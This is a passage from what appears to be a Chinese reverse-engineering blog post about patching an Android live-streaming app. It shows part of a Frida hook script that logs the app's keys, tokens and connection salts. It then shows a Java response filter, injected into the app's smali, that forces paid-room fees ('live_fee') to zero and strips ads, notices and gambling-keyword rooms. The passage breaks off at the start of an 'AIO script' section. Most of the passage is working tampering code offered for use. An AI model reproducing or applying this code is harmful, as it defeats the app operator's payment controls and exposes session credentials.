class="string">&#x27;cd/jsWS6Noql+UlpgSadL1wMHQ/gO6lZqZ+slgt3MtAJS3WoVON5c9v1zWteoqImeZeuh377bVOcowhCUD5TNN0wA5uT0CxgrURzMPv7O2EMXMXEG9EK8I6rvRjJ08TgnA3tnKmzbCuXyJyHknNVMkWBoVxDnaLmGIu3Zkw0M1LMn3wm+e7OceZd0RbXJGenSxDcyIMaRkDQVy6J2NeVI26MRF+uIaeT0UuAaHJ3bVmNEJr/6DxiQhMyeEIFFczE4dAZVbUHjv5I/T4nvyeY+ibeAPEdaAdUu2yVbk/x9NOBfaqi/iVyyEPf2bXtR3qk0udk6kSRBp4K4vTDppcGMzQtOpYUqPZ/hI6/1sIuJGUZ84Vc3IBLtOqtDBlO0hyYb16VqWf51u2VnjwYj0pexoBjFKTypT3fhbvS4OS/rmNCaO1WMKkkEDNXlWhnfa+2DXk/A1vkE3zl1Ev+II1O/Askt9p566LyHFyGsfJzKoO5f8ZTzLOdAH8khSxLZSRMR+KBPejdFqzYBxQEOM1nXId+fW6jzEjBhqlce+mJga8Iu502YtAvDK/DsGgCQ1MSQ08N/hu/ONiw4JZ0CU2z5P0ByEJRCzVOOPTAcyoVHKXAPr7a4b6aAb8Xc3CUxNOt1LBHY88UuaqYISFgPfP2xBZNlOMErdS/kjMvbnk6IYIJ2C9gZFFvefroqvpcPeifTvyaUo0jgH+ZQJ4ALb8Cpku8i2V37LTGtpoa7/rkBGXUr5AFoXt7bG7Lkqg2+lcLEjdF2L99lS73I8KKI2nRCgwbaVHT//KzDIp2bhObyNdVf6wXDzu/1ofuvsRXXD/QFXt4HGg9TTpfJd7UIfIE47EMY+q7WVbxRTSYsY5cLWR3BNf1EBecn4YSmmJ1TsHGo9WmS5vWoQGJMCbDwHBecmkZosxTs5KqXo6eaxH5ObeqL9fHhyKGGbAWPFPmprU6hKIv9NH3JXIKs/vxRIIbuyZOUUBndIaEZTncTtidlkxJgxjkmiGId1euCJsw79RCTkStnIU/xNi1jI6SlPKBylVY6M6uimw4ahUb74pziKFjJEYFOSC3m74AOFpTTHn3qsv1frFNfONHiMbG+X5f8BWYvhG++HJkkCvYcK2qI1vzG5WllAvx0BvVuoUAhxK/7UI+8BqvLg6m5u+OdFa91V2lOhAcErbwRGVWWbqmrRfh1oOs4jyy1a6go5UyXMtMUKYN1tfXkf06ZcP0Q5lqVH71aJc8VTdms0Yufv+m4pPbREtB3PJ3zUQZDRXaifEQOtWC7Eqj3XFe8LU9ahClmBhHO6+831AhNNLqTBgWtSNODGm3601QCNppDCHhXBcvsx7gE1mhS1oXCTtaX91/EHwmSMruPPlEeRkspJcOtwLBZGcQ4KVQazbHRLBI+rWdiITHBmLbU+XMCMKN3Y0teeoUHKy+jR7lfcQNc1kDL4VwHwr8X7B8GHhvOt6SKizCind2a2NfSg2tzYqJq99Kem4ay+eGVv5/reB+iIOc+TpvjxQrP64ZF4qNl5/mICyP/F4HdgRCEdldziv9SOfryDGj4noulTAP2KIS5hUYut5jmTa8aMtEhJW4xuflMq+obQ8JmidsjpIqaTwiFIriDJmVJI0SdxKWwQbDWSqN8Lnn6wfr9b3oq7uG75Iha1CMGyIgJJVahhlaCDm0AKKCfN31iMJM8GC5IE1e+24NZfsHPyDNfIluUaNueW5ygQoHzzvq9WNWviW9eBRRQlx3uaq86VIfuPWp0Qc6N8BP7muzCbWiC4sECcx6t7yHQEERgDfR/ZoaAfT2cCFJHIIFDp27pqA2VBslRrpprrwswmY=&#x27;</span></span><br><span class="line">                <span class="keyword">if</span>(mc.<span class="title function_">argument</span>(<span class="string">&quot;appKey&quot;</span>) != key)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;appKey: &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&quot;appKey&quot;</span>))</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;token : &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&quot;token&quot;</span>))</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;appKey: Same&#x27;</span> + <span class="string">&#x27;; token : &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&quot;token&quot;</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;token: &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&quot;token&quot;</span>) +</span><br><span class="line">                            <span class="string">&#x27;; ddomain: &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&#x27;ddomain&#x27;</span>) +</span><br><span class="line">                            <span class="string">&#x27;; dport: &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&#x27;dport&#x27;</span>) + </span><br><span class="line">                            <span class="string">&#x27;; group_name: &#x27;</span> + mc.<span class="title function_">argument</span>(<span class="string">&#x27;group_name&#x27;</span>))</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">Kiwi</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.kiwi.sdk.Kiwi&quot;</span>);</span><br><span class="line">        <span class="title class_">Kiwi</span>[<span class="string">&quot;init_appname&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title function_">init_appname</span>(str);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;init_appname param value is &#x27;</span> + str);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;init_appname  ret  value is &#x27;</span> + ret);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">Kiwi</span>[<span class="string">&quot;server_to_local&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title function_">server_to_local</span>(str);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;server_to_local ret value is &#x27;</span> + ret);</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> <span class="title class_">SuperNetworkKitPlugin</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.example.super_network_kit.SuperNetworkKitPlugin&quot;</span>);</span><br><span class="line">        <span class="title class_">SuperNetworkKitPlugin</span>[<span class="string">&quot;onMethodCall&quot;</span>].<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">methodCall, result</span>)&#123;</span><br><span class="line">            <span class="keyword">let</span> ret = <span class="variable language_">this</span>.<span class="title function_">onMethodCall</span>(methodCall, result);</span><br><span class="line">            <span class="keyword">let</span> mc = <span class="title class_">Java</span>.<span class="title function_">cast</span>(methodCall, <span class="title class_">MethodCall</span>);</span><br><span class="line">            <span class="keyword">let</span> mn = mc.<span class="property">method</span>.<span class="property">value</span>;</span><br><span class="line">            <span class="keyword">if</span> (mn == <span class="string">&#x27;sendString&#x27;</span>) &#123;</span><br><span class="line">                <span class="keyword">let</span> connID = mc.<span class="title function_">argument</span>(<span class="string">&quot;connID&quot;</span>);</span><br><span class="line">                <span class="keyword">let</span> data = mc.<span class="title function_">argument</span>(<span class="string">&quot;data&quot;</span>).<span class="title function_">toString</span>();</span><br><span class="line">                <span class="keyword">let</span> dj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;send -&gt; random: &#x27;</span> + dj[<span class="string">&#x27;random&#x27;</span>] + <span class="string">&#x27;; connID: &#x27;</span> + connID + <span class="string">&#x27;; data: &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(dj));</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span> (mn == <span class="string">&#x27;initConnection&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">let</span> url = mc.<span class="title function_">argument</span>(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">                <span class="keyword">let</span> salt = mc.<span class="title function_">argument</span>(<span class="string">&quot;salt&quot;</span>);</span><br><span class="line">                <span class="keyword">let</span> enableZip = mc.<span class="title function_">argument</span>(<span class="string">&quot;enableZip&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;initConnection: &#x27;</span> + <span class="string">`<span class="subst">$&#123;url&#125;</span>, <span class="subst">$&#123;salt&#125;</span>, <span class="subst">$&#123;enableZip&#125;</span>`</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">let</span> connID = mc.<span class="title function_">argument</span>(<span class="string">&quot;connID&quot;</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;connID: &#x27;</span> + connID + <span class="string">&#x27;; method: &#x27;</span> + mn + <span class="string">&#x27;; Now: &#x27;</span> + <span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>());</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setImmediate</span>(hook)</span><br></pre></td></tr></table></figure><h2 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h2><p>然后经过一段时间的探索，基本搞定了各个重要字段的含义。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.json.JSONException;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONObject;</span><br><span class="line"><span class="keyword">import</span> org.json.JSONArray;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">ret_value</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        JSONObject ret_json;</span><br><span class="line">        JSONObject data;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ret_json = <span class="keyword">new</span> <span class="title class_">JSONObject</span>(ret_value);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException ignored) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ctl</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ret_json.has(<span class="string">&quot;ctl&quot;</span>)) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">ctl</span> <span class="operator">=</span> ret_json.getString(<span class="string">&quot;ctl&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (ctl.contains(<span class="string">&quot;notice&quot;</span>)) &#123;</span><br><span class="line">                    ret_json.put(<span class="string">&quot;data&quot;</span>, <span class="keyword">new</span> <span class="title class_">JSONArray</span>());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl.contains(<span class="string">&quot;room_msg&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">JSONArray</span> <span class="variable">new_msgs</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">                    <span class="type">JSONArray</span> <span class="variable">room_msg</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>(ret_json.getString(<span class="string">&quot;data&quot;</span>));</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; room_msg.length(); i++) &#123;</span><br><span class="line">                        <span class="type">JSONObject</span> <span class="variable">msg_i</span> <span class="operator">=</span> room_msg.getJSONObject(i);</span><br><span class="line">                        <span class="type">Integer</span> <span class="variable">content_type</span> <span class="operator">=</span> msg_i.getInt(<span class="string">&quot;content_type&quot;</span>);</span><br><span class="line">                        <span class="keyword">if</span> (content_type.equals(<span class="number">1</span>)) &#123;</span><br><span class="line">                            new_msgs.put(msg_i);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ret_json.put(<span class="string">&quot;data&quot;</span>, new_msgs.toString());</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctl.contains(<span class="string">&quot;room&quot;</span>)) &#123;</span><br><span class="line">                    data = ret_json.getJSONObject(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">                    ret_json.put(<span class="string">&quot;data&quot;</span>, data.put(<span class="string">&quot;live_fee&quot;</span>, <span class="number">0</span>));</span><br><span class="line">                &#125;</span><br><span class="line">                ret_value = ret_json.toString();</span><br><span class="line">                <span class="keyword">return</span> ret_value;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (JSONException ignoed) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// response</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (ret_json.has(<span class="string">&quot;data&quot;</span>)) &#123;</span><br><span class="line">                data = ret_json.getJSONObject(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (data.has(<span class="string">&quot;body&quot;</span>)) &#123;</span><br><span class="line">                    <span class="comment">// response of /room_push/join</span></span><br><span class="line">                    <span class="type">JSONObject</span> <span class="variable">body</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONObject</span>((String)data.get(<span class="string">&quot;body&quot;</span>));</span><br><span class="line">                    <span class="keyword">if</span>(body.has(<span class="string">&quot;room&quot;</span>))&#123;</span><br><span class="line">                        <span class="type">JSONObject</span> <span class="variable">room</span> <span class="operator">=</span> (JSONObject)(body.get(<span class="string">&quot;room&quot;</span>));</span><br><span class="line">                        room.put(<span class="string">&quot;live_fee&quot;</span>, <span class="number">0</span>).put(<span class="string">&quot;chess_id&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">                        body.put(<span class="string">&quot;room&quot;</span>, room);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(body.has(<span class="string">&quot;podcast&quot;</span>))&#123;</span><br><span class="line">                        <span class="type">JSONObject</span> <span class="variable">podcast</span> <span class="operator">=</span> (JSONObject)(body.get(<span class="string">&quot;podcast&quot;</span>));</span><br><span class="line">                        <span class="comment">// podcast.put(&quot;card_price&quot;, 0).put(&quot;is_pay_podcast&quot;, 0);</span></span><br><span class="line">                        body.put(<span class="string">&quot;podcast&quot;</span>, podcast);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// response of /room/get_list_by_ids</span></span><br><span class="line">                    <span class="keyword">if</span>(body.has(<span class="string">&quot;rooms&quot;</span>))&#123;</span><br><span class="line">                        <span class="type">JSONArray</span> <span class="variable">array_room</span> <span class="operator">=</span> body.getJSONArray(<span class="string">&quot;rooms&quot;</span>);</span><br><span class="line">                        <span class="type">JSONArray</span> <span class="variable">new_rooms</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">                        <span class="comment">// game signature</span></span><br><span class="line">                        String[] words = <span class="keyword">new</span> <span class="title class_">String</span>[]</span><br><span class="line">                            &#123;<span class="string">&quot;快三&quot;</span>, <span class="string">&quot;六合&quot;</span>, <span class="string">&quot;带飞&quot;</span>, <span class="string">&quot;带你飞&quot;</span>, <span class="string">&quot;燊&quot;</span>, <span class="string">&quot;大佛&quot;</span>, <span class="string">&quot;回血&quot;</span>, <span class="string">&quot;赌王&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;赌神&quot;</span>, <span class="string">&quot;赌圣&quot;</span>, <span class="string">&quot;财神&quot;</span>, <span class="string">&quot;暴富&quot;</span>, <span class="string">&quot;致富&quot;</span>, <span class="string">&quot;公式&quot;</span>, <span class="string">&quot;计划&quot;</span>, <span class="string">&quot;澳门&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;赛车&quot;</span>, <span class="string">&quot;快车&quot;</span>, <span class="string">&quot;牛牛&quot;</span>, <span class="string">&quot;回归&quot;</span>, <span class="string">&quot;实力&quot;</span>, <span class="string">&quot;车友&quot;</span>, <span class="string">&quot;派彩&quot;</span>, <span class="string">&quot;上车&quot;</span>,</span><br><span class="line">                            <span class="string">&quot;大注&quot;</span>, <span class="string">&quot;头文字D&quot;</span>, <span class="string">&quot;兔鼻&quot;</span>, <span class="string">&quot;牛逼哄哄&quot;</span>, <span class="string">&quot;单带&quot;</span>&#125;;</span><br><span class="line">                        Integer[] _ids = <span class="keyword">new</span> <span class="title class_">Integer</span>[]</span><br><span class="line">                            &#123;<span class="number">1965425522</span>, <span class="number">12273040</span>, <span class="number">1559390190</span>, <span class="number">1092923344</span>, <span class="number">1475912101</span>, <span class="number">904403059</span>&#125;;</span><br><span class="line">                        List&lt;Integer&gt; ids = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(Arrays.asList(_ids));</span><br><span class="line">                        <span class="comment">// remove signature</span></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; array_room.length(); i++)&#123;</span><br><span class="line">                            <span class="type">JSONObject</span> <span class="variable">room_i</span> <span class="operator">=</span> array_room.getJSONObject(i);</span><br><span class="line">                            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">                            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)room_i.get(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                            <span class="keyword">for</span> (String word : words) &#123;</span><br><span class="line">                                flag = flag || name.contains(word);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="keyword">if</span> ( !(flag || ids.contains(room_i.getInt(<span class="string">&quot;id&quot;</span>))) )&#123;</span><br><span class="line">                                room_i.put(<span class="string">&quot;chess_id&quot;</span>, -<span class="number">1</span>);</span><br><span class="line">                                new_rooms.put(room_i);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        body.put(<span class="string">&quot;rooms&quot;</span>, new_rooms);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// response of ad and banner</span></span><br><span class="line">                    <span class="keyword">if</span> (body.has(<span class="string">&quot;result&quot;</span>)) &#123;</span><br><span class="line">                        <span class="type">JSONArray</span> <span class="variable">result</span> <span class="operator">=</span> body.getJSONArray(<span class="string">&quot;result&quot;</span>);</span><br><span class="line">                        <span class="type">JSONArray</span> <span class="variable">new_result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i &lt; result.length(); i++) &#123;</span><br><span class="line">                            <span class="type">JSONObject</span> <span class="variable">res</span> <span class="operator">=</span> result.getJSONObject(i);</span><br><span class="line">                            <span class="keyword">if</span> (res.has(<span class="string">&quot;ad_pos_name&quot;</span>)) &#123;</span><br><span class="line">                                res.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span> (res.getInt(<span class="string">&quot;ad_type_id&quot;</span>) == <span class="number">2</span>)</span><br><span class="line">                                    new_result.put(res);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.has(<span class="string">&quot;notice_type&quot;</span>)) &#123;</span><br><span class="line">                                res.put(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.has(<span class="string">&quot;history&quot;</span>)) &#123;</span><br><span class="line">                                <span class="type">Integer</span> <span class="variable">content_type</span> <span class="operator">=</span> res.getInt(<span class="string">&quot;content_type&quot;</span>);</span><br><span class="line">                                <span class="keyword">if</span> (content_type.equals(<span class="number">1</span>))</span><br><span class="line">                                    new_result.put(res);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (res.has(<span class="string">&quot;title&quot;</span>)) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (!res.getString(<span class="string">&quot;title&quot;</span>).contains(<span class="string">&quot;公告&quot;</span>)) &#123;</span><br><span class="line">                                    new_result.put(res);</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                new_result = result;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        body.put(<span class="string">&quot;result&quot;</span>, new_result);</span><br><span class="line">                    &#125;</span><br><span class="line">                    data.put(<span class="string">&quot;body&quot;</span>, body);</span><br><span class="line">                &#125;</span><br><span class="line">                ret_json.put(<span class="string">&quot;data&quot;</span>, data);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// ret</span></span><br><span class="line">            ret_value = ret_json.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodError | Exception ignored) &#123;</span><br><span class="line">            <span class="keyword">return</span> ret_value;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> ret_value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译之后，替换 okio.ByteString 的 smali 中。</p><h2 id="AIO-脚本"><a href="#AIO-脚本" class="headerlink" title="AIO 脚本"></a>AIO 脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span 